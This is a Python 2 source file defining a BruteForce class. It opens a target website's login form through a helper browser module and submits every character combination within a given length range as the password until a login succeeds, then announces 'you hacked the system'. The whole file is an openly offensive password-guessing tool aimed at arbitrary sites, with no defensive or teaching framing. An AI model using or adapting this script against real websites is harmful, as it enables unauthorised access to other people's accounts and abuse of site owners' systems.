from itertools import product
from browsers import Browsers
import httplib
from urlparse import urlparse
import socket

class BruteForce:
	'''
	class to bruteforce password
	'''
	def __init__(self):
		self.bro = Browsers()

	def checkNetConnectivity(self):
		'''
		function to check internet connectivity
		'''
                REMOTE_SERVER = 'www.google.com'
                try:
                    host = socket.gethostbyname(REMOTE_SERVER)
                    s = socket.create_connection((host,80),2)
                    return True
                except:
                    return False

	def validateURL(self, url):
		'''
		Function to validate url existence
		'''
		try:
    		    p = urlparse(url)
		    conn = httplib.HTTPConnection(p.netloc)
    		    conn.request('HEAD', p.path)
    		    resp = conn.getresponse()
    		    return resp.status < 400
		except:
		    return False


	def call_brute_force(self, search_string, url, next_url, passlen_range, keyValues, bruteforce_key, form_by_name = None, form_by_index = None):

		'''
		search_string -> string through which you want to make combinations and search
		url -->  URL of site you want to try bruteforce
		next --> URL of next site after successful login
		form_by_name --> specify the name of form
		form_by_index --> specify the index of targeted form
		passlen_range --> mention the range of password length you want to try, remember 				that more the range more it will take time. So play smartly.
				It should be list. Eg: [1,3] len range 1 to 3
		keyValues --> form key value pair. Eg: {'email':'','pass':''}
		bruteforce_key --> form field name to bruteforce
		'''

		if not self.checkNetConnectivity():
			return "Internet connectivity issue"
		elif not self.validateURL(url) or not self.validateURL(next_url):
			return "Please input valid url"
		elif form_by_name==None and form_by_index==None:
			return "Please either input form_by_name or form_by_index"
		elif form_by_name and not isinstance(form_by_name,str):
			return "form name should be string"
		elif form_by_index and not isinstance(form_by_index,(int,long)):
			return "form index should be integer"
		elif not isinstance(passlen_range,list) or not len(passlen_range)==2:
			return "Please input valid passlen_range, eg:[1,3]"
		elif not isinstance(keyValues,dict):
			return "Please input valid keyValues, Eg: {'email':'','pass':''}"
		elif not isinstance(bruteforce_key,str):
			return "Please input valid bruteforce field name"
		elif not isinstance(search_string,str):
			return "Please input search_string as string"
		else:
			
			self.bro.setBrowserOptions()
			self.bro.openurl(url)
			if form_by_index:
				function = self.bro.select_from_by_index
				val = form_by_index
			elif form_by_name:
				function = self.bro.select_from_by_name
				val = form_by_name
			
			for count in xrange(passlen_range[0],passlen_range[1]+1):
				print count
				ss = product(search_string,repeat=count)
				for each in ss:
					(stat, res)=function(url, next_url, val, keyValues,bruteforce_key,''.join(each))
					if stat:
						self.bro.closeconn()
						return "Congratulations, you hacked the system.. Result is %s",''.join(each)

